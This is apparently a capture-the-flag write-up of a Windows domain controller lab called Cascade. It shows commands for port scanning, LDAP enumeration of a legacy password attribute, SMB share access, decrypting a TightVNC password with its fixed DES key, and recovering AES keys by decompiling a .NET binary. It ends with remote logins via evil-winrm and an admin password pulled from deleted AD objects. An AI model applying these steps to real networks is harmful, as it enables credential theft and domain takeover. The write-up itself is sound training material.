## **Summary**

`r.thompson`'s password was obtained using an ldap search, then and encrypted password for `s.smith` was found in a SMB share `Data`. In another share `Audit$` there was an sqlite database file containing an AES encrypted password for the user `ArkSvc`, the key and IV to decrypt this password were found after decompiling `CascAudit.exe` and `CascCrypto.dll`.

`ArkSvc` was able to access deleted objects, `TempAdmin`'s password was disclosed which was the same used by the `Administrator`. 

## **Enum**

### **nmap**

Initial port scan reveals the presence of multiple open ports like 88, 445,389... indicating that we are dealing with a domain controller in the domain `cascade.local`

```sh
sudo nmap 10.10.10.182 -p- -sS -T4 -oN nmap/ss-all.nmap
ports=$(cat nmap/ss-all.nmap | grep open | cut -d '/' -f 1 | tr '\n' ',')
nmap 10.10.10.182 -p $ports -sV -sC -oN nmap/svc.nmap -Pn
```

### **ldap**

An LDAP search showed a list of users, we choose to include the distinguished name of only one user because we're gonna be using it next.

```sh
$ ldapsearch -x -H ldap://10.10.10.182 -b "dc=cascade,dc=local" | grep 'dn' | grep -i 'users'
...
dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
...
```

Using this dn we perfomed another ldap scan and we found the credentials for the user `r.thompson`.

```sh
ldapsearch -x -H ldap://cascade.local/ -b "CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local" "cn" "sAMAccountName" "cascadeLegacyPwd"
```

The password was base64 encoded, so we decoded it.

```
$ echo 'clk0bjVldmE=' | base64 -d
rY4n5eva
```

### **smb**

`r.thompson` had read access over `Data` share

```sh
crackmapexec smb 10.10.10.182 -u r.thompson -p rY4n5eva --shares
```

We accessed the share, and browsed to the `IT` directory where we found a registry file called `VNC Install.reg` inside `s.smith` directory.

```sh
smbclient.py r.thompson:rY4n5eva@cascade.local
```

![](/assets/cascade/004.png)

In this registry file we found a password in an unusual format.

```smbclient
# cat IT/Temp/s.smith/VNC Install.reg
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
...
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
...
```
With the help of [VNCDecrypt](https://github.com/billchaison/VNCDecrypt) we were able to decrypt it: `sT333ve2`

```sh
echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
```

We used the directory name (`s.smith`) as a username with the password we decrypted to access `Audit$` share.

```sh
smbclient.py s.smith:sT333ve2@cascade.local
```

Inside `DB` directory we found an sqlite3 database `Audit.db` and downloaded it.

![](/assets/cascade/009.png)

We then opened it with `sqlitebrowser` and got two tables:

DeletedUserAudit:

![](/assets/cascade/010.png)

ldap:

![](/assets/cascade/011.png)

On the ldap table there was a password for `ArkSvc` user: `BQO5l5Kj9MdErXx6Q6AGOw==`, but it seemed to be encrypted.

From the `$Audit` share, we downloaded `CascAudit.exe` and `CascCrypto.dll` to a windows machine and decompiled them using [dotPeek](https://www.jetbrains.com/decompiler/).

![](/assets/cascade/012.png)

In `CascAudit/CascAudiot/MainModule` we found the key used for encryption: `c4scadek3y654321`.

![](/assets/cascade/013.png)

And the Initialization Vector(IV) was found in `CascCrypto/CascCrypto/Crypto`: `1tdyjCbY1Ix49842`.

We also noted that the encryption algorithm used is `AES-128`.

Knowing the algorithm used, the key and the IV we decrypted the password using `cyberchef`: 

```
w3lc0meFr31nd
```

## **Foothold**

### **s.smith**

`s.smith` and `Arksvc` are members of `Remote Management Users` group, which allowed them to access the machine using `winrm`.

We first logged in as `s.smith` to retreive th first flag.

```sh
evil-winrm -i 10.10.10.182 -u s.smith -p sT333ve2
```

![](/assets/cascade/006.png)

### **ArkSvc**

Then as `ArkSvc`, as `s.smith` gave us nothing to escalate our privileges.

```sh
evil-winrm -i 10.10.10.182 -u ArkSvc -p w3lc0meFr31nd
```

![](/assets/cascade/016.png)

## **PrivEsc**

`ArkSvc` is a member of `AD Recycle Bin` group, which gives him the ability to view deleted objects.

```
whoami /groups
```

In `Data` share there was a note in a html file `IT\Email Archives\Meeting_Notes_June_2018.html` stating that a user `TempAdmin` which uses the same password as the domain administrator was deleted at the end of 2018.

![](/assets/cascade/018.png)

We got a base64 encoded password: `YmFDVDNyMWFOMDBkbGVz` from the deleted objects.

```powershell
Get-ADObject -filter 'isDeleted -eq $true -and samaccountname -eq "TempAdmin"' -includeDeletedObjects -Properties *
```

![](/assets/cascade/019.png)

Decoded it

```sh
$ base64 -d <<< 'YmFDVDNyMWFOMDBkbGVz'
baCT3r1aN00dles
```

And used it to access the machine as `Administrator` using `evil-winrm`.

```sh
evil-winrm -i 10.10.10.182 -u Administrator -p baCT3r1aN00dles
```
